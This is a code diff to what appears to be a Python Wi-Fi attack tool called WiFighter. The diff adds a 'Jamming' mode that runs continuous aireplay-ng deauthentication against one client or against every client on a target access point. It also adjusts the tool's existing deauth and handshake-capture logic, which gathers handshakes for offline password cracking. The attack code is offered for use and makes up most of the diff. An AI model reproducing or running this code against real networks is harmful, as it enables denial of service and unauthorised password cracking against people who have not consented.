@@ -36,8 +36,9 @@ LOGO = r"""
 # | GLOBAL VARIABLES | #
 
 interfering_services = ['NetworkManager', 'wpa_supplicant']
-attack_list = ['Handshake Crack', 'WPS Crack']
+attack_list = ['Handshake Crack', 'WPS Crack', 'Jamming']
 deauth_modes = ['Client deauth', 'Broadcast', 'Silent']
+jammer_modes = ['Client jamming', 'Broadcast jamming']
 
 wifi_networks = []
 interface = None
@@ -120,7 +121,7 @@ Cracked wifi password: {crack}
 
 #---------------------------------
 
- # | MONITOR MODE | #
+ # | INTERRFAC MANAGMENT | #
 
 def start_services(verbose):
      global interfering_services
@@ -325,6 +326,34 @@ def choose_deauth_mode():
      except KeyboardInterrupt:
           print(f"\n\n{BLUE}Exiting the tool...{RESET}")
 
+def choose_jammer_mode():
+     global jammer_modes
+     
+     print(f'{CYAN}| Select Jammer Mode |{RESET}\n')
+
+     idx = 1
+     # Show attack modes
+     for jammer_mode in jammer_modes:
+          print(f"{idx}. {jammer_mode}")
+          idx += 1
+     try:
+          while True:     
+               try:
+                    # Prompt the user to choose an deauth mode by number
+                    choice = int(input(f"\nMode number: ")) - 1
+               except ValueError:
+                    print(f"{RED}Invalid input! Please enter a valid number.{RESET}")
+                    continue
+
+               # Check if the choice is in range
+               if 0 <= choice < len(jammer_modes):
+                    jammer_mode = jammer_modes[choice]
+                    return jammer_mode # Return chosen deauth mode
+               else:
+                    print(f"{RED}Invalid choice! Please select a valid number from the list.{RESET}")
+     except KeyboardInterrupt:
+          print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
 def choose_wordlist():
      global wifighter_path
      wordlists_path = f'{wifighter_path}/wordlists/'
@@ -513,7 +542,7 @@ def list_ap(wifi_networks):
      print("\nPress [Ctrl + C] to stop")
 
 
- #------------------------------------------------------------------------------------
+ #-----------------------------------------------------------------------------------
 
 # | Handshake Crack | #
 
@@ -549,7 +578,6 @@ def list_clients(sniffed_clients, ssid, bssid):
      print(f"{MAGENTA}{table}{RESET}")
      print("\nPress [Ctrl + C] to stop")
 def choose_target_client():
-     global sniffed_clients, wifighter_path, output_file
      try:
           while True:     
                try:
@@ -568,6 +596,8 @@ def choose_target_client():
           print(f"\n\n{BLUE}Exiting the tool...{RESET}")
 
 def handshake_crack(target_ap, interface, deauth_mode):
+     global sniffed_clients, wifighter_path
+
      # Prepare variables
      ssid = target_ap['SSID'] if target_ap['SSID'] else None
      bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
@@ -645,6 +675,8 @@ def handshake_crack(target_ap, interface, deauth_mode):
                               print(f"{CYAN}[>]{RESET} Deauth packet send to client {target_client}{RESET}")
                          except:
                               pass
+                    else:
+                         print(f'{YELLOW}No target client set!\n{RESET}')
                elif deauth_mode == "broadcast":
                     try:
                          command = ['sudo', 'aireplay-ng', '-0', '1', '-a', bssid, interface]
@@ -652,7 +684,8 @@ def handshake_crack(target_ap, interface, deauth_mode):
                          print(f"{CYAN}[>]{RESET} Deauth packet send to broadcast")
                     except:
                          pass
-     
+               else:
+                    pass
 
      logo()
      print(f'{CYAN}| Handshake Crack |{RESET}\n')
@@ -752,6 +785,52 @@ def handshake_crack(target_ap, interface, deauth_mode):
           print(f"{YELLOW}[>]{RESET} Handshake available for offline cracking -> WiFighter/attacks/{target.replace(' ', '_')}/{output_file}")
 
 
+
+# | Jamming | #
+
+def jam_network(target_ap, interface, jammer_mode): 
+     # Prepare variables
+     ssid = target_ap['SSID'] if target_ap['SSID'] else None
+     bssid = target_ap['BSSID'] if target_ap['BSSID'] else None
+     target = ssid if ssid else bssid # Set target by checking if SSID set
+     jammer_mode = jammer_mode.lower()
+     target_client = None
+
+
+     def run_aireplay(interface, bssid, target, target_client, jammer_mode):
+          if interface and bssid and jammer_mode:
+               if jammer_mode == "client jamming":
+                    if target_client:
+                         try:
+                              # Continuosly deauth client
+                              print(f"{CYAN}[>]{RESET}Jamming {target_client} on {target}... []{RESET}")
+                              print("Press [Ctrl + C] to stop")
+                              command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, '-c', target_client, interface]
+                              subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                         except:
+                              pass
+                    else:
+                         print(f'{RED}No target client set!\n{RESET}')
+               elif jammer_mode == "broadcast jamming":
+                    try:
+                         # Continuosly deauth deauth all clients
+                         print(f"{CYAN}[>]{RESET} Jamming all clients on {target}...")
+                         print("Press [Ctrl + C] to stop")
+                         command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, interface]
+                         subprocess.run(command, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    except:
+                         pass
+               else:
+                    pass
+
+     deauth_clients = multiprocessing.Process(target = run_aireplay, args=(interface, bssid, target, target_client, jammer_mode))
+     
+     logo()
+     print(f'{CYAN}| Jamming |{RESET}\n')
+     # Run aireplay-ng
+     deauth_clients.start()
+     deauth_clients.join()
+
 #------------------------------------------------------------------------------------
 
 
@@ -809,7 +888,6 @@ else:
                     if scan_output and isinstance(scan_output, list):
                          wifi_networks = scan_output 
                     if wifi_networks:
-                         print(wifi_networks)
                          logo()
                          list_ap(wifi_networks) # Show available AP's in table
                     time.sleep(1) # Wait before each scan
@@ -839,9 +917,19 @@ else:
 
           elif attack == 'WPS Crack':
                print('WPS...')
+
+          elif attack == 'Jamming':
+               jammer_mode = choose_jammer_mode()
+               if jammer_mode:
+                    try:
+                         jam_network(target_ap, interface, jammer_mode) # Start attack
+                    except KeyboardInterrupt:
+                         print(f"\n\n{BLUE}Exiting the tool...{RESET}")
+
      
 
      # On tool end turn everything back on
+     print(f"\n\n{BLUE}Exiting the tool...{RESET}")
      if interface:
           try:
                monitor_switch(None, 'stop', interface)
